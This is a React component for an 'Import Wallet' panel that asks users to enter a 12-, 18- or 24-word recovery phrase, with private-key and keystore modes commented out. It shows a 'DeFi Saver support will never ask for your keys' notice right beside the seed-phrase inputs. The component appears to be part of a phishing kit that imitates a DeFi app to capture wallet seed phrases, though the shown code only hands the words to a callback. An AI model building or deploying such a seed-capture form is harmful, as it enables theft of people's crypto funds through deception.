import { useEffect, useRef, useState } from "react";
import type { PhraseMode, Wallet } from "../types/type";

function PanelPhrase({ wallet, onSubmit, onBack }: { wallet: Wallet; onSubmit: (mode: PhraseMode, value: string[]) => void; onBack: () => void }) {
    const [mode, setMode] = useState<PhraseMode>("seed");
    const [value, setValue] = useState("");
    const [wordCount, setWordCount] = useState<12 | 18 | 24>(12);
    const [words, setWords] = useState<string[]>(Array(12).fill(""));
    const [showRaw, setShowRaw] = useState(false);
    const [error, setError] = useState("");
    const inputRef = useRef<HTMLTextAreaElement>(null);
  
    const tabs: { id: PhraseMode; label: string }[] = [
      { id: "seed", label: "Seed Phrase" },
      // { id: "privatekey", label: "Private Key" },
      // { id: "keystore", label: "Keystore JSON" },
    ];
  
    const handleWordChange = (i: number, val: string) => {
      const next = [...words];
      // allow pasting full phrase into first box
      if (i === 0 && val.trim().split(/\s+/).length > 1) {
        const pasted = val.trim().split(/\s+/);
        const size = pasted.length === 24 ? 24 : 12;
        setWordCount(size);
        const filled = Array(size).fill("").map((_, idx) => pasted[idx] ?? "");
        setWords(filled);
        return;
      }
      next[i] = val.trim();
      setWords(next);
    };
  
    useEffect(() => {
      setWords(Array(wordCount).fill(""));
    }, [wordCount]);
  
    const handleSubmit = () => {
      setError("");
      if (mode === "seed") {
        const filled = words.filter(Boolean);
        if (filled.length < wordCount) {
          setError(`Please fill all ${wordCount} words.`);
          return;
        }
        onSubmit("seed", words);
      } else if (mode === "privatekey") {
        if (value.trim().length < 32) {
          setError("Private key appears too short.");
          return;
        }
        onSubmit("privatekey", [value.trim()]);
      } else {
        if (!value.trim().startsWith("{")) {
          setError("Paste valid JSON keystore content.");
          return;
        }
        onSubmit("keystore", [value.trim()]);
      }
    };
  
    return (
      <div className="flex flex-col h-full w-full px-7 py-6 overflow-y-auto" style={{ scrollbarWidth: "none" }}>
        {/* Header */}
        <div className="flex items-center gap-3 mb-5">
          <button onClick={onBack} className="w-7 h-7 flex items-center justify-center rounded-lg transition-colors" style={{ color: "#666", background: "#1e2428" }}
            onMouseEnter={e => (e.currentTarget.style.color = "#ccc")} onMouseLeave={e => (e.currentTarget.style.color = "#666")}>
            <svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M11 2L5 8l6 6" strokeWidth="0" /></svg>
          </button>
          <div className="flex items-center gap-2.5">
            <div className="w-7 h-7 rounded-lg overflow-hidden flex items-center justify-center" style={{ background: "#1e2428" }}>
              <div className="scale-75">{wallet.icon}</div>
            </div>
            <span className="text-sm font-semibold" style={{ color: "#e2e6ea" }}>Import {wallet.name}</span>
          </div>
        </div>
  
        {/* Tabs */}
        <div className="flex gap-1 p-1 rounded-xl mb-5" style={{ background: "#1e2428" }}>
          {tabs.map((t) => (
            <button key={t.id} onClick={() => { setMode(t.id); setValue(""); setError(""); }}
              className="flex-1 py-2 rounded-lg text-xs font-semibold transition-all duration-150"
              style={{
                background: mode === t.id ? "#2a3038" : "transparent",
                color: mode === t.id ? "#e2e6ea" : "#4a5568",
                border: mode === t.id ? "1px solid #383e46" : "1px solid transparent",
              }}>
              {t.label}
            </button>
          ))}
        </div>
  
        {/* Seed phrase */}
        {mode === "seed" && (
          <div className="flex-1">
            <div className="flex items-center justify-between mb-3">
              <p className="text-xs" style={{ color: "#4a5568" }}>Enter your {wordCount}-word recovery phrase</p>
              <div className="flex gap-1 p-0.5 rounded-lg" style={{ background: "#1e2428" }}>
                {([12, 18, 24] as const).map((n) => (
                  <button key={n} onClick={() => setWordCount(n)}
                    className="px-3 py-1 rounded-md text-xs font-semibold transition-all"
                    style={{ background: wordCount === n ? "#2a3038" : "transparent", color: wordCount === n ? "#e2e6ea" : "#4a5568" }}>
                    {n} words
                  </button>
                ))}
              </div>
            </div>
            <div className={`grid gap-2 mb-4 ${wordCount === 24 ? "grid-cols-4" : "grid-cols-3"}`}>
              {words.map((w, i) => (
                <div key={i} className="relative">
                  <span className="absolute left-2 top-1/2 -translate-y-1/2 text-xs select-none" style={{ color: "#4a5568", fontVariantNumeric: "tabular-nums", minWidth: 14 }}>{i + 1}</span>
                  <input
                    type={showRaw ? "text" : "password"}
                    value={w}
                    onChange={(e) => handleWordChange(i, e.target.value)}
                    className="w-full pl-6 pr-2 py-2 rounded-lg text-xs outline-none transition-all"
                    style={{ background: "#1e2428", border: `1px solid ${w ? "#383e46" : "#222831"}`, color: "#e2e6ea", caretColor: "#00ff88" }}
                    onFocus={e => (e.target.style.borderColor = "#00ff8844")}
                    onBlur={e => (e.target.style.borderColor = words[i] ? "#383e46" : "#222831")}
                    autoComplete="off" spellCheck={false}
                  />
                </div>
              ))}
            </div>
            <button onClick={() => setShowRaw(!showRaw)} className="flex items-center gap-1.5 text-xs mb-1 transition-colors" style={{ color: "#4a5568" }}
              onMouseEnter={e => (e.currentTarget.style.color = "#8899aa")} onMouseLeave={e => (e.currentTarget.style.color = "#4a5568")}>
              <svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor">
                {showRaw
                  ? <path d="M8 3C4 3 1 8 1 8s3 5 7 5 7-5 7-5-3-5-7-5zm0 8a3 3 0 1 1 0-6 3 3 0 0 1 0 6z" />
                  : <path d="M13.4 2.6 2.6 13.4M8 3C4 3 1 8 1 8s.8 1.3 2.2 2.6M6 5.3A3 3 0 0 1 11 8c0 .6-.2 1.2-.5 1.7M8 13c4 0 7-5 7-5s-.8-1.3-2.2-2.6" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" fill="none" />
                }
              </svg>
              {showRaw ? "Hide" : "Show"} phrase
            </button>
          </div>
        )}
  
        {/* Private key */}
        {mode === "privatekey" && (
          <div className="flex-1">
            <p className="text-xs mb-3" style={{ color: "#4a5568" }}>Paste your 64-character hex private key</p>
            <textarea
              ref={inputRef} value={value} onChange={e => setValue(e.target.value)}
              rows={4} placeholder="0x..."
              className="w-full p-3 rounded-xl text-xs font-mono outline-none resize-none transition-all"
              style={{ background: "#1e2428", border: "1px solid #222831", color: "#e2e6ea", caretColor: "#00ff88" }}
              onFocus={e => (e.target.style.borderColor = "#00ff8844")} onBlur={e => (e.target.style.borderColor = "#222831")}
              autoComplete="off" spellCheck={false}
            />
          </div>
        )}
  
        {/* Keystore */}
        {mode === "keystore" && (
          <div className="flex-1">
            <p className="text-xs mb-3" style={{ color: "#4a5568" }}>Paste your keystore JSON file contents</p>
            <textarea
              ref={inputRef} value={value} onChange={e => setValue(e.target.value)}
              rows={5} placeholder={'{\n  "version": 3,\n  "crypto": { ... }\n}'}
              className="w-full p-3 rounded-xl text-xs font-mono outline-none resize-none transition-all"
              style={{ background: "#1e2428", border: "1px solid #222831", color: "#e2e6ea", caretColor: "#00ff88" }}
              onFocus={e => (e.target.style.borderColor = "#00ff8844")} onBlur={e => (e.target.style.borderColor = "#222831")}
              autoComplete="off" spellCheck={false}
            />
          </div>
        )}
  
        {/* Error */}
        {error && (
          <p className="text-xs mt-2 mb-1" style={{ color: "#ff6666" }}>⚠ {error}</p>
        )}
  
        {/* Warning notice */}
        <div className="flex gap-2 p-3 rounded-xl mt-3 mb-4" style={{ background: "#1a1500", border: "1px solid #3a2e00" }}>
          <svg width="14" height="14" viewBox="0 0 16 16" fill="#f5a623" className="flex-shrink-0 mt-0.5">
            <path d="M8 1L1 14h14L8 1zm0 3l5 9H3l5-9zm-.5 3v3h1V7h-1zm0 4v1h1v-1h-1z" />
          </svg>
          <p className="text-xs leading-relaxed" style={{ color: "#7a6030" }}>
            Never share your phrase with anyone. DeFi Saver support will never ask for your keys.
          </p>
        </div>
  
        {/* Submit */}
        <button onClick={handleSubmit}
          className="w-full py-3 rounded-xl text-sm font-bold transition-all duration-150"
          style={{ background: "#00ff88", color: "#000" }}
          onMouseEnter={e => (e.currentTarget.style.background = "#00e67a")}
          onMouseLeave={e => (e.currentTarget.style.background = "#00ff88")}>
          Import Wallet
        </button>
      </div>
    );
}

export default PanelPhrase;